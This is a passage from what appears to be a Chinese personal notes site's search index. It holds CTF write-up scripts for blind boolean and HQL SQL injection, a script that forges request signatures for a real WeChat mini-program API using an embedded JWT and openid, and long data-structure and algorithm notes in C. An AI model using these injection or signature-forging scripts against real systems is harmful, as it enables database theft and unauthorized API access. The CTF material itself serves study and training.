= 128 mid = (low+high)//2 while low \u0026lt; high: time.sleep(0.1) # 1^(ascii(substr((select(database())),%d,1))\u0026lt;%d)^1 # 1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))\u0026lt;%d)^1 # 1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;users\u0026#39;)),%d,1))\u0026lt;%d)^1 # 1^(ascii(substr((select(group_concat(password))from(users)),%d,1))\u0026lt;%d)^1 # 1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))\u0026lt;%d)^1 # 1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;ctftraining\u0026#39;)),%d,1))\u0026lt;%d)^1 # 1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=\u0026#39;ctftraining\u0026#39;(and)schema_name=\u0026#39;ctftraining\u0026#39;)),%d,1))\u0026lt;%d)^1 # 1^(ascii(substr((select(group_concat(Flag))from(ctftraining.Flag)),%d,1))\u0026lt;%d)^1 parse[\u0026#39;id\u0026#39;]=\u0026#34;1^(ascii(substr((select(group_concat(Flag))from(ctftraining.Flag)),%d,1))\u0026lt;%d)^1\u0026#34; % (i,mid) res = requests.get(host,params=parse) if res.status_code!=200: print(\u0026#39;!200\u0026#39;) continue # print(res.text) if \u0026#34;title\u0026#34; in res.text: high = mid else: low = mid+1 mid=(low+high)//2 if mid \u0026lt;= 32 or mid \u0026gt;=127: break if(mid-1==33): g+=1 if(g\u0026gt;=5): break else: g=0 ans += chr(mid-1) print(\u0026#34;database is -\u0026gt; \u0026#34;+ans) getDatabase() # news # admin,contents import requests import time url = \u0026#34;http://2adc3617-76d6-4705-84e4-1c0e3f21baa2.node4.buuoj.cn:81/search.php\u0026#34; payload = { \u0026#34;id\u0026#34; : \u0026#34;\u0026#34; } result = \u0026#34;\u0026#34; g=0 for i in range(1,1000): l = 33 r =130 mid = (l+r)\u0026gt;\u0026gt;1 while(l\u0026lt;r): payload[\u0026#34;id\u0026#34;] = \u0026#34;0^\u0026#34; + \u0026#34;(ascii(substr((select(group_concat(password))from(F1naI1y)),{0},1))\u0026gt;{1})\u0026#34;.format(i,mid) html = requests.post(url,params=payload) print(payload) if(html.code!=200): time.sleep(0.2) print(\u0026#39;错误,以延迟0.2秒\u0026#39;,html.code) continue # 正常的回显内容 if \u0026#34;others\u0026#34; in html.text: l = mid+1 else: r = mid mid = (l+r)\u0026gt;\u0026gt;1 if(chr(mid)==\u0026#34; \u0026#34;): break result = result + chr(mid) #出现连续的感叹号,就停 if(mid==33): g+=1 if(g\u0026gt;=5): break else: g=0 print(result) print(\u0026#34;tables: \u0026#34; ,result) 有一道题的java后端代码\npublic class UserDaoImpl extends HibernateDaoSupport implements UserDao { public List\u0026lt;User\u0026gt; findUserByName(final String name) { return (List\u0026lt;User\u0026gt;)this.getHibernateTemplate().find(\u0026#34;from User where name =\u0026#39;\u0026#34; + name + \u0026#34;\u0026#39;\u0026#34;); } public List\u0026lt;User\u0026gt; loginCheck(final String name, final String password) { return (List\u0026lt;User\u0026gt;)this.getHibernateTemplate().find(\u0026#34;from User where name =\u0026#39;\u0026#34; + name + \u0026#34;\u0026#39; and password = \u0026#39;\u0026#34; + password + \u0026#34;\u0026#39;\u0026#34;); } } 脚本\nimport requests s=requests.session() flag=\u0026#39;\u0026#39; for i in range(1,50): p=\u0026#39;\u0026#39; for j in range(1,255): payload=\u0026#34;(select%0Aascii(substr(id,\u0026#34;+str(i)+\u0026#34;,1))%0Afrom%0AFlag%0Awhere%0Aid\u0026lt;2)\u0026lt;\u0026#39;\u0026#34;+str(j)+\u0026#34;\u0026#39;\u0026#34; url=\u0026#34;http://111.200.241.244:55604/zhuanxvlogin?user.name=admin\u0026#39;%0Aor%0A\u0026#34;+payload+\u0026#34;%0Aor%0Aname%0Alike%0A\u0026#39;admin\u0026amp;user.password=1\u0026#34; r1=s.get(url) if len(r1.text)\u0026gt;20000 and p!=\u0026#39;\u0026#39;: flag+=p print(i,flag) break p=chr(j) print()\n"},{"id":76,"href":"/docs/re/new/%E7%A5%9E%E5%9B%BE%E5%A3%81%E7%BA%B8/","title":"神图壁纸","section":"demo","content":"import random import time def encode(_str): staticchars = \u0026#34;PXhw7UT1B0a9kQDKZsjIASmOezxYG4CHo5Jyfg2b8FLpEvRr3WtVnlqMidu6cN\u0026#34; encodechars = \u0026#34;\u0026#34; for i in range(len(_str)): num0 = staticchars.find(_str[i]) if num0 == -1: code = _str[i] else: code = staticchars[(num0 + 3) % 62] num1 = random.randint(0, 61) num2 = random.randint(0, 61) encodechars += staticchars[num1] + code + staticchars[num2] return encodechars # def encode1(_str): # s=\u0026#39;PXhw7UT1B0a9kQDKZsjIASmOezxYG4CHo5Jyfg2b8FLpEvRr3WtVnlqMidu6cN\u0026#39; # en=\u0026#39;\u0026#39; # for i in _str: def timestamp(): # return 1699883428 return int(time.time()) def sign(): return encode(\u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVuaWQiOiJvR29TZjVKczRPRF95R2JSUDlVVGpMY0RmNjc0IiwiZXhwaXJlX3RpbWUiOjE2OTczMDQ1MzV9.)FxVKiDH9rnMKEuTNMkRa7ibMrhp-Vdi-FHBgWOomdaQ###\u0026#34;+str(t)) import requests t=timestamp() headers = { \u0026#39;authority\u0026#39;: \u0026#39;stapi.youpengw.com\u0026#39;, \u0026#39;accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;accept-language\u0026#39;: \u0026#39;zh-CN,zh;q=0.9\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;sec-fetch-dest\u0026#39;: \u0026#39;empty\u0026#39;, \u0026#39;sec-fetch-mode\u0026#39;: \u0026#39;cors\u0026#39;, \u0026#39;sec-fetch-site\u0026#39;: \u0026#39;cross-site\u0026#39;, \u0026#39;sign\u0026#39;: sign(), \u0026#39;user-agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8447\u0026#39;, \u0026#39;xweb_xhr\u0026#39;: \u0026#39;1\u0026#39;, } json_data = { \u0026#39;homepage_id\u0026#39;: \u0026#39;233033\u0026#39;, \u0026#39;classify_id\u0026#39;: 5, \u0026#39;sort_type\u0026#39;: \u0026#39;default\u0026#39;, \u0026#39;album_id\u0026#39;: 0, \u0026#39;uid\u0026#39;: 219050, \u0026#39;page\u0026#39;: 1, \u0026#39;limit\u0026#39;: 15, \u0026#39;action\u0026#39;: \u0026#39;cover\u0026#39;, \u0026#39;version\u0026#39;: 1, \u0026#39;appid\u0026#39;: \u0026#39;wx535ad18d22b24807\u0026#39;, \u0026#39;openid\u0026#39;: \u0026#39;oGoSf5Js4OD_yGbRP9UTjLcDf674\u0026#39;, \u0026#39;timestamp\u0026#39;: t, } response = requests.post(\u0026#39;https://stapi.youpengw.com/miniwechat/v1/natujun/photoList\u0026#39;, headers=headers, json=json_data) print(response.text) # print(response.text) # k=response.json() # s=[] # for i in k[\u0026#39;data\u0026#39;][\u0026#39;photoList\u0026#39;]: # s.append(i[\u0026#39;url\u0026#39;]) # print(s) sign解密代码，能够解出token，但是还是要报错\nsign=\u0026#39;lYRP2DigtqkTXYtw7pVOEl6NcxWk6hOgrtjsZqqJaa5ZQq6mbvrA5nHgZ3UxHL41HyYXmp6rcxsQ6sdgm6mJHBPfGPAmNmaoch9i6wag1vDGE.jsYEI2i1gGm3yeX8BH0Vq9SNYPQUpnreZZr63zxHZ6JxgaL3yjWYOFKyDym0HDIaGSpUqlmjo3Xd4GQNW08wpJWqWEFRDpRfuyWmGF6Vg5oeEqB9tsQaiJXqblq1vHA9R0NuleCDLkZ6WhMzr4hG8SPGXLdkZkm6m6UcTSY6v2Ibt7J1UwgTLFQsx7Mgg0UiiF7aeVAqWhwRbFLCunegBRc6aCxNCS8yrZHF31x9r0IkXjeG6Muyjs8ZZlwawNuRIG8UqDBDRJ.0XEFy4LCqorjAd6absKMJkbDVAt5iMueugGjE8rA0NEJ0BwhJqu85KwxW6gQ0H1bC6G3LHKu1dtqGUuPRa4-SeqOKcMA6Tw-wQEqDJkP9W48E7nHcxkxy38zIfcKrQiqZRC#h1#nz#PvaHGPW8DDrDg7DwtoAg1gfp7mF9x1T\u0026#39; key=\u0026#39;PXhw7UT1B0a9kQDKZsjIASmOezxYG4CHo5Jyfg2b8FLpEvRr3WtVnlqMidu6cN\u0026#39; import re token=[\u0026#39;\u0026#39; for i in range(300)] for i in re.findall(r\u0026#39;.{3}\u0026#39;,sign): if(key.find(i[1]) \u0026lt;3): if(key.find(i[1])==-1): print(i[1],end=\u0026#39;\u0026#39;) continue print(key[62-key.find(i[1])],end=\u0026#39;\u0026#39;) else: print(key[key.find(i[1])-3],end=\u0026#39;\u0026#39;) "},{"id":77,"href":"/docs/learm/math/%E7%AD%89%E4%BB%B7%E6%97%A0%E7%A9%B7%E5%B0%8F/","title":"等价无穷小","section":"math","content":"等价无穷小\n"},{"id":78,"href":"/docs/learm/%E4%B8%8A%E8%AF%BE/%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/","title":"算法与数据结构笔记","section":"class notes","content":"\r数据结构与算法笔记\r#\r第一章 引论\r#\r如果说编程语言是程序员的招式，那么数据结构和算法就相当于程序员的内功。所以要学好数据结构和算法，写这篇笔记的目的是为了自我不断积累。不积跬步，无以至千里！\n1.1 数学知识复习\r#\r1.1.1 指数\r#\r1.1.2 对数\r#\r在计算机科学中，除非有特别的声明，所有的对数都是以 2 为底的\n记住：log 1 = 0，log 2 = 1，log 1024 = 10， log 1048576 = 20\n1.1.3 级数\r#\r1.1.4 模运算\r#\r如果 N 整除 A - B，那么就说 A 与 B 模 N 同余，记为 A ≡ B（mod N）\n1.1.5 证明方法\r#\r证明数据结构分析中的结论的两个最常用的方法是归纳法和反证法，证明一个定理不成立的最好的方法是举出一个反例。\n归纳法证明 反证法证明 1.2 递归简论\r#\r1.2.1 打印输出数\r#\r#include \u0026lt;stdio.h\u0026gt; void printOut(int n){ if(n \u0026gt;= 10){ printOut(n / 10); } printf(\u0026#34;%d\u0026#34;, n % 10); } int main(){ int n, result; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); printOut(n); return 0; } 1.3 数据结构的概念\r#\r程序 = 数据结构 + 算法 是由 N.Wirth（沃斯）提出来的。\n数据结构指的是数据与数据之间的逻辑关系 算法指的是解决特定问题的步骤和方法 理解下面三点：\n第二章 算法分析\r#\r算法（algorithm）是为求解一个问题需要遵循的、被清楚地指定的简单指令的集合。对于一个问题，一旦给定某种算法并且（以某种方式）确定其是正确的，那么重要的一步就是确定该算法将需要多少诸如时间或者空间等资源量的问题。\n2.1 算法的概念\r#\r2.2 数学基础\r#\r2.3 计算模型\r#\r2.4 算法效率的度量\r#\r2.4.1 时间复杂度\r#\r!\u0026gt; 如何评估算法时间开销？\n所以要进行事前预估，事前预估算法时间开销 T(n) 与问题规模n的关系 (T表示“time”)\n时间复杂度量级比较 $$ O(1)\u0026lt;O(log_2n)\u0026lt;O(n)\u0026lt;O(nlog_2n)\u0026lt;O(n^2)\u0026lt;O(n^3)\u0026lt;O(2^n)\u0026lt;O(n!)\u0026lt;O(n^n) $$ 2.4.2 空间复杂度\r#\r算法可以原地工作——S(n)=O(1)\n计算规则与时间复杂度类似\n递归型算法\n空间复杂度=递归调用的深度\n2.5 分析问题\r#\r2.5.1 最大子序列和\r#\r【题目】\n给定（可能有负数）整数a(1)、a(2)、……a(n)，求 a(1)+a(2)+……+a(j)的最大值。 为方便起见，若所有的整数为负数，则最大子序列和为0. 也就是：在一系列整数中，找出连续的若干个整数，这若干个整数之和 最大。 【代码实现】\n方法一：穷举法 穷举所有可能，由于嵌套三层 for 循环，运行时间 O(N^3) 算法思想：算出每个子序列的和，即算出序列中第 i 个到第 j 个数的和 (j \u0026gt;= i) ，并进行比较 C 语言版：函数原型为 int maxSubSum(int a[]); #include \u0026lt;stdio.h\u0026gt; int maxSubSum(int a[]){ int maxSum = 0; int sum, i, j, k; int len = sizeof(a) / sizeof(int); for(i = 0; i \u0026lt; len; i++){ for(j = i; j \u0026lt; len; j++){ sum = 0; for(k = i; k \u0026lt;= j; k++){ sum += a[k];//计算 a[i] 到 a[j] 的和 } if(sum \u0026gt; maxSum){ maxSum = sum; } } } return maxSum; } int main(){ int a[] = {-2, 11, -4, 13, -5, -2}; int max = maxSubSum(a); printf(\u0026#34;%d\\n\u0026#34;,max); return 0; } C 语言版：函数原型为 int maxSubSum(int a[], int n); #include \u0026lt;stdio.h\u0026gt; int maxSubSum(int a[], int n){ int maxSum = 0; int sum, i, j, k; for(i = 0; i \u0026lt; n; i++){ for(j = i; j \u0026lt; n; j++){ sum = 0; for(k = i; k \u0026lt;= j; k++){ sum += a[k];//计算 a[i] 到 a[j] 的和 } if(sum \u0026gt; maxSum){ maxSum = sum; } } } return maxSum; } int main(){ //int a[] = {-2, 11, -4, 13, -5, -2}; int a[] = { -2, 4, -3, 5, 7, -1, 8, 1 }; int len = sizeof(a) / sizeof(int);//有负数所以 strlen(a) 不能用 int max = maxSubSum(a, len); printf(\u0026#34;%d\\n\u0026#34;,max);\treturn 0; } 方法二：\n在第一种的基础上简化，撤除一层 for 循环，运行时间 O(N^2) 算法思想：第一个算法的第三个 for 循环中有大量不必要的重复计算，如：计算 i 到 j 的和，然而 i 到 j-1 的和在前一次的循环中已经计算过，无需重复计算，故该 for 循环可以去掉 C 语言版\n#include \u0026lt;stdio.h\u0026gt; int maxSubSum(int a[], int n){ int maxSum = 0; int sum, i, j; for(i = 0; i \u0026lt; n; i++){ sum = 0; for(j = i; j \u0026lt; n; j++){ sum += a[j]; if(sum \u0026gt; maxSum){ maxSum = sum; } } } return maxSum; } int main(){ //int a[] = {-2, 11, -4, 13, -5, -2}; int a[] = { -2, 4, -3, 5, 7, -1, 8, 1 }; int len = sizeof(a) / sizeof(int);//有负数所以 strlen(a) 不能用 int max = maxSubSum(a, len); printf(\u0026#34;%d\\n\u0026#34;,max);\treturn 0; } 方法三：分而治之 算法思想：把问题分成两个大致相等的子问题，然后递归地对它们求解，这是“分”的部分。“治”阶段将两个子问题的解修补到一起并可能再做些少量的附加工作，最后得到整个问题的解。 在该问题中，如果把序列从中间分为两部分，那么最大子序列和可能在三处出现，要么整个出现在输入数据的左半部，要么整个出现在右半部，要么跨越分界线。前两种情况可以递归求解，第三种情况的最大和可以通过求出前半部分（包括前半部分的最后一个元素）的最大和以及后半部分（包含后半部分的第一个元素）的最大和而得到，此时将两个和相加。 运行时间 O( N log N ) C 语言版 #include \u0026lt;stdio.h\u0026gt; int maxSubSum(int a[], int left, int right){ // 判断是否只有一个元素 if (left == right) { if (a[left] \u0026gt; 0) { return a[left]; } else { return 0; } } int center = (left + right) / 2; int maxLeftSum = maxSubSum(a, left, center); int maxRightSum = maxSubSum(a, center + 1, right); // 左端处理 int maxLeftBorderSum = 0; int leftBorderSum = 0; int i; for (i = center; i \u0026gt;= left; i--) { leftBorderSum += a[i]; if (leftBorderSum \u0026gt; maxLeftBorderSum) { maxLeftBorderSum = leftBorderSum; } } // 右端处理 int maxRightBorderSum = 0; int rightBorderSum = 0; for (i = center + 1; i \u0026lt;= right; i++) { rightBorderSum += a[i]; if (rightBorderSum \u0026gt; maxRightBorderSum) { maxRightBorderSum = rightBorderSum; } } // 返回最大值 int maxBorderSum = maxLeftBorderSum + maxRightBorderSum; return maxBorderSum \u0026gt; maxLeftSum ? maxBorderSum \u0026gt; maxRightSum ? maxBorderSum : maxRightSum : maxLeftSum \u0026gt; maxRightSum ? maxLeftSum : maxRightSum; } int main(){ //int a[] = {-2, 11, -4, 13, -5, -2}; int a[] = { -2, 4, -3, 5, 7, -1, 8, 1 }; int max = maxSubSum(a, 0, sizeof(a) / sizeof(int) - 1); printf(\u0026#34;%d\\n\u0026#34;,max); return 0; } 方法四：最优起点，扫描法\n算法思想：设 a[i] 为和最大序列的起点，则如果 a[i] 是负的，那么它不可能代表最优序列的起点，因为任何包含 a[i] 作为起点的子序列都可以通过 a[i+1] 作起点而得到改进。 类似的，任何负的子序列也不可能是最优子序列的前缀。 运行时间：O(N) C 语言版\n#include \u0026lt;stdio.h\u0026gt; int maxSubSum(int a[], int n){ int maxSum = 0; int sum = a[0], i; /*考虑如果全是负数，那么返回最大的负数， 如果最后的和为正，那么就使用扫描法*/ for(i = 1; i \u0026lt; n; i++){ if(sum \u0026lt; 0){//当前数小于0，换为下一个数 sum = a[i]; }else{ sum += a[i]; } if(sum \u0026gt; maxSum){ maxSum = sum; } } return maxSum; } int main(){ //int a[] = {-2, 11, -4, 13, -5, -2}; int a[] = { -2, 4, -3, 5, 7, -1, 8, 1 }; int len = sizeof(a) / sizeof(int);//有负数所以 strlen(a) 不能用 int max = maxSubSum(a, len); printf(\u0026#34;%d\\n\u0026#34;,max);\treturn 0; } 2.5.2 二分查找\r#\rbinary search 又叫对分查找、对半查找，时间复杂度 O(log N)\n【代码实现】\nC 语言版 #include \u0026lt;stdio.h\u0026gt; int binarySearch(int a[], int n, int x){ int low, mid, high; low = 0; high = n - 1; while(low \u0026lt;= high){ mid = (low + high) / 2; if(a[mid] \u0026lt; x){ low = mid + 1; }else if(a[mid] \u0026gt; x){ high = mid - 1; }else{ return mid; } } return -1; } int main(){ int a[] = { 1, 2, 3, 4, 5, 6 }; int len = sizeof(a) / sizeof(int); int x; scanf(\u0026#34;%d\u0026#34;,\u0026amp;x); if(binarySearch(a, len, x) != -1){ printf(\u0026#34;Found %d.\\n\u0026#34;,x); }else{ printf(\u0026#34;NotFound %d.\\n\u0026#34;,x); } return 0; } 2.5.3 最大公约数\r#\r又叫欧几里德算法 gcd(M, N)\n【代码实现】\nC 语言版：使用 while 循环 #include \u0026lt;stdio.h\u0026gt; int gcd(int a, int b){ int tmp; while(b \u0026gt; 0){ tmp = a % b; a = b; b = tmp; } return a; } int main(){ int x, y; scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;x, \u0026amp;y); printf(\u0026#34;%d\\n\u0026#34;, gcd(x, y)); return 0; } C 语言版：使用递归 #include \u0026lt;stdio.h\u0026gt; int gcd(int a, int b){ if(b == 0){ return a; }else{ return gcd(b, a % b); } } int main(){ int x, y; scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;x, \u0026amp;y); printf(\u0026#34;%d\\n\u0026#34;, gcd(x, y)); return 0; } 2.5.4 幂运算\r#\r【题目】\n求 x^n\n【代码实现】\nC 语言版：递归 #include \u0026lt;stdio.h\u0026gt; int pow(int x, int n){ if(n == 0){ return 1; } if(n == 1){ return x; } if(n % 2 == 0){ return pow(x * x, n / 2); }else{ return pow(x * x, n / 2) * x; } } int main(){ printf(\u0026#34;%d\\n\u0026#34;, pow(2, 5));//2^5 return 0; } 第三章 线性表\r#\r线性表是具有相同类型的 n（n\u0026gt;=0）个元素的有限序列，其中 n 为表长，当 n=0 时，该表为空表。\n线性表的特点：\n一般线性表包含下列基本操作：\n初始化 销毁 重置为空表 判断是否为空 获取长度 根据位置获取对应元素 查找元素 获取指定元素的前驱和后继元素 插入元素 删除元素 遍历元素 3.1 抽象数据类型(ADT)\r#\rADT 线性表(SeqList) Data 线性表的数据对象集合为{a1,a2,....,an},每个元素的类型均为DataType。 其中，除了第一个元素a1外，每一个元素有且只有一个直接前驱元素，除最后一个元素an外， 每一个元素有且只有一个直接后继元素。数据元素之间的关系是一对一的关系。 Operation InitList(*L):初始化操作，建立一个空的线性表。 ListEmpty(L):若线性表为空，返回true，否则返回false。 ClearList(*L):线性表清空。 GetElem(L,i,*e):将线性表L中第i个位置元素返回给e。 LocateElem(L,e):在线性表L中查找与给定值e相等的元素，如果查找成功,返回该元素在表中的序列号； 否则，返回0表示失败。 InsertList(*L,i,e):在线性表的第i个位置插入元素e。 DeleteList(*L,i,*e):删除线性表L中的第i个元素，并用e返回其值 ListLength(L):返回线性表L的元素个数。 PrintList(L):打印线性表 根据存储方式不同，线性表可以分为顺序表和链表：\n数据元素在内存中集中存储，采用顺序表示结构，简称 “顺序存储”； 数据元素在内存中分散存储，采用链式表示结构，简称 “链式存储” 3.2 顺序表\r#\r是指将线性表中的各个元素依次存放在一组地址连续的存储单元中，通常将这种方法存储的线性表称为顺序表。\n线性表中第 i 个元素的存储位置与第一个元素的 a1 的存储位置满足以下关系，location(ai) = location(a1) + (i-1) * m。其中，第一个元素的位置 location(a1) 称为起始地址或基地址。 顺序表逻辑上相邻的元素在物理上也是相邻的。每一个数据元素的存储位置都和线性表的起始位置相差一个和数据元素在线性表中的位序成正比的常数。只要确定了第一个元素的起始位置，线性表中的任一个元素都可以随机存取，因此，线性表的顺序存储结构是一种随机存取的存储结构。由于 C 语言的数组具有随机存储特别，因此采用数组来描述顺序表。 定义顺序表结构体： typedef struct{ DataType list[MaxSize]; int length; }SeqList; 其中，DataType 表示数据元素类型，list 用于存储线性表中的数据元素，length 用来表示线性表中数据元素的个数，SeqList 是结构体类型名。定义一个顺序表代码：SeqList L; 指向顺序表的指针：SeqList *L;\n顺序表的基本运算如下：\n（1）初始化线性表\nvoid InitList(SeqList *L){ L-\u0026gt;length =0; //把线性表的长度设为0 } （2）线性表非空判断\nint ListEmpty(SeqList *L){ if(L-\u0026gt;length == 0) return 1; else return 0; } （3）线性表清空\nvoid ClearList(SeqList *L){//线性表清空。 L-\u0026gt;length =0; //把线性表的长度设为0 } （4）按序号查找\nint GetElem(SeqList *L, int i, DataType *e){ //查找线性表中第i个元素，查找成功将该值返回给e，并返回1表示成功，反正返回-1表失败。 if(i \u0026lt; 1 || i \u0026gt; L-\u0026gt;length){ return -1; } *e = L-\u0026gt;list[i - 1]; return 1; } （5）按内容查找\nint LocateElem(SeqList *L, DataType e){ //查找线性表中元素值为e的元素 int i; for (i = 0; i \u0026lt; L-\u0026gt;length ; i++) if(L-\u0026gt;list[i] == e){ return i + 1; } return 0;//找不到返回0 } （6）插入操作\n//在顺序表的第i个位置插入元素e，成功返回1， //失败返回-1，顺序表满了返回0 int InsertList(SeqList *L, int i, DataType e){ int j; if(i \u0026lt; 1 || i \u0026gt; L-\u0026gt;length + 1){ return -1; } else if(L-\u0026gt;length \u0026gt;= MaxSize){ return 0; }else{ for(j = L-\u0026gt;length; j \u0026gt;= i; j--){ L-\u0026gt;list[j] = L-\u0026gt;list[j-1]; } L-\u0026gt;list[i-1] =e ;//插入元素到i个位置 L-\u0026gt;length = L-\u0026gt;length + 1; return 1; } } （7）删除操作\n觉得文章有帮助，不妨请我喝杯 Coffee，祝福好心人年年高升！\n（8）返回线性表个数\nint ListLength(SeqList *L){//返回线性表L的元素个数。 return L-\u0026gt;length; } （9）打印线性表\nvoid PrintList(SeqList *L){//打印线性表,即顺序表遍历 int i; for(i = 0; i \u0026lt; L-\u0026gt;length; i++){ printf(\u0026#34;%d\\n\u0026#34;, L-\u0026gt;list[i]); } } （10）主函数调用测试 main()\nint main(){\tSeqList *L; L = (SeqList *)malloc(sizeof(SeqList));//申请内存空间 //L-\u0026gt;length = 10; printf(\u0026#34;初始化数组------\\n\u0026#34;); //测试初始化数组长度为0 InitList(L); printf(\u0026#34;插入节点------\\n\u0026#34;); //测试插入数据元素 InsertList(L, 1, 55); InsertList(L, 2, 57);\tInsertList(L, 3, 78); InsertList(L, 2, 89); //查看线性表是否为空 if(ListEmpty(L) == 1){ printf(\u0026#34;线性表为空\\n\u0026#34;); }else{ printf(\u0026#34;线性表不为空\\n\u0026#34;); } //测试 打印线性表 PrintList(L) ; int a = 123; int *p = \u0026amp;a; printf(\u0026#34;删除节点------\\n\u0026#34;); //删除测试 DeleteList(L, 2, p); printf(\u0026#34;%d\\n\u0026#34;,*p); printf(\u0026#34;删除节点后------\\n\u0026#34;); //测试 打印线性表 PrintList(L) ; int l = ListLength(L); printf(\u0026#34;线性表长度为%d\\n\u0026#34;,l); //查找元素 //按内容查找 if(LocateElem(L, 55)){ printf(\u0026#34;找到\\n\u0026#34;); } //按序号查找 GetElem(L, 2, p); printf(\u0026#34;%d\\n\u0026#34;,*p); return 0; } 提供另一种方式写顺序表，不申请内存空间 malloc\n#include \u0026lt;stdio.h\u0026gt; #define MaxSize 100 //定义数据类型 typedef int DataType; typedef struct{ //线性数组 DataType list[MaxSize]; //数组长度 int length; }SeqList; //初始化线性表 void InitList(SeqList *L){ L-\u0026gt;length =0; //把线性表的长度设为0 } int ListEmpty(SeqList L){ if(L.length == 0) return 1; else return 0; } void ClearList(SeqList *L){//线性表清空。 L-\u0026gt;length =0; //把线性表的长度设为0 } int GetElem(SeqList L, int i, DataType *e){ //查找线性表中第i个元素，查找成功将该值返回给e，并返回1表示成功，反正返回-1表失败。 if(i \u0026lt; 1 || i \u0026gt; L.length){ return -1; } *e = L.list[i - 1]; return 1; } int LocateElem(SeqList L, DataType e){ //查找线性表中元素值为e的元素 int i; for (i = 0; i \u0026lt; L.length ; i++) if(L.list[i] == e){ return i + 1; } return 0;//找不到返回0 } //在顺序表的第i个位置插入元素e，成功返回1，失败返回-1，顺序表满了返回0 int InsertList(SeqList *L, int i, DataType e){ int j; if(i \u0026lt; 1 || i \u0026gt; L-\u0026gt;length + 1){ return -1; } else if(L-\u0026gt;length \u0026gt;= MaxSize){ return 0; }else{ for(j = L-\u0026gt;length; j \u0026gt;= i; j--){ L-\u0026gt;list[j] = L-\u0026gt;list[j-1]; } L-\u0026gt;list[i-1] =e ;//插入元素到i个位置 L-\u0026gt;length = L-\u0026gt;length + 1; return 1; } } int DeleteList(SeqList *L, int i, DataType *e){ int j; if(L-\u0026gt;length \u0026lt;= 0){ return 0; } else if(i \u0026lt; 1 || i \u0026gt; L-\u0026gt;length){ return -1; }else{ *e = L-\u0026gt;list[i-1]; for(j = i;j \u0026lt;= L-\u0026gt;length-1; j++){ L-\u0026gt;list[j-1] = L-\u0026gt;list[j]; } L-\u0026gt;length = L-\u0026gt;length - 1; return 1; } } int ListLength(SeqList L){//返回线性表L的元素个数。 return L.length; } void PrintList(SeqList L){//打印线性表,即顺序表遍历 int i; for(i = 0; i \u0026lt; L.length; i++){ printf(\u0026#34;%d\\n\u0026#34;, L.list[i]); } } int main(){ SeqList L; //L.length = 0; //L = (SeqList *)malloc(sizeof(SeqList));//申请内存空间 //L-\u0026gt;length = 10; printf(\u0026#34;初始化数组------\\n\u0026#34;); //测试初始化数组长度为0 InitList(\u0026amp;L); printf(\u0026#34;插入节点------\\n\u0026#34;); //测试插入数据元素 InsertList(\u0026amp;L, 1, 55); InsertList(\u0026amp;L, 2, 57);\tInsertList(\u0026amp;L, 3, 78); InsertList(\u0026amp;L, 2, 89); //查看线性表是否为空 if(ListEmpty(L) == 1){ printf(\u0026#34;线性表为空\\n\u0026#34;); }else{ printf(\u0026#34;线性表不为空\\n\u0026#34;); } //测试 打印线性表 PrintList(L) ; int a = 123; int *p = \u0026amp;a; printf(\u0026#34;删除节点------\\n\u0026#34;); //删除测试 DeleteList(\u0026amp;L, 2, p); printf(\u0026#34;%d\\n\u0026#34;,*p); printf(\u0026#34;删除节点后------\\n\u0026#34;); //测试 打印线性表 PrintList(L) ; int l = ListLength(L); printf(\u0026#34;线性表长度为%d\\n\u0026#34;,l); //查找元素 //按内容查找 if(LocateElem(L, 55)){ printf(\u0026#34;找到\\n\u0026#34;); } //按序号查找 GetElem(L, 2, p); printf(\u0026#34;%d\\n\u0026#34;,*p); return 0; } !\u0026gt; 小结：顺序表的优缺点。\n（1）优点：无须关心表中元素之间的关系，所以不用增加额外的存储空间；可以快速地取表中任意位置的元素。\n（2）缺点：插入和删除操作需要移动大量元素。使用前需事先分配好内存空间，当线性表长度变化较大时，难以确定存储空间的容量。分配空间过大会造成存储空间的巨大浪费，分配的空间过小，难以适应问题的需求\n3.3 链式表\r#\r链式表包括单链表、双链表、循环链表、循环单链表等等等\n3.3.1 单链表\r#\r单链表的存储结构用C语言描述：\ntypedef int DataType; typedef struct Node{ DataType data;//创建数据域 struct Node *next;//创建指针域 }LinkList; 其中，LinkList 是链表的结点类型。\n单链表的基本运算如下：\n（1）初始化单链表\nLinkList * InitList(LinkList *p){ p = (LinkList *)malloc(sizeof(LinkList)); if(!p){ exit(-1);//exit函数，退出程序。 } p-\u0026gt;next = NULL; return p; } !\u0026gt; 真正使用的时候，直接在 CreateList 中定义即可，如下写法，根据实际需求使用：\nLinkList *q = (LinkList *)malloc(sizeof(LinkList)); if (!q){ exit(-1); //exit函数，退出程序。 }\tLinkList * r = q; //创建尾指针指向尾节点 r-\u0026gt;next = NULL; 或者：\nLinkList *q = (LinkList *)malloc(sizeof(LinkList)); if (!q){ exit(-1); //exit函数，退出程序。 }\tq = NULL; 或者：\nLinkList *q = (LinkList *)malloc(sizeof(LinkList)); if (!q){ exit(-1); //exit函数，退出程序。 }\tq-\u0026gt;next = NULL; （2）单链表非空判断\nint ListEmpty(LinkList *p){ int flag = 0; if(!p){ flag = 1; } return flag; } （3）按序号查询操作\n//按序号查找单链表中第i个结点 LinkList *GetElem(LinkList *head,int i){ LinkList *p; int j = 0; if(ListEmpty(head)||i\u0026lt;1){ //如果链表为空 return NULL; } p = head; while(p-\u0026gt;next !=NULL \u0026amp;\u0026amp; j\u0026lt;i-1){//保证p的下个结点不为空 p = p-\u0026gt;next; j++; } if(j==i-1)//找到第i个结点 return p; else return NULL; } （4）按内容查找操作\n//按内容查找单链表中元素值为e的元素 int 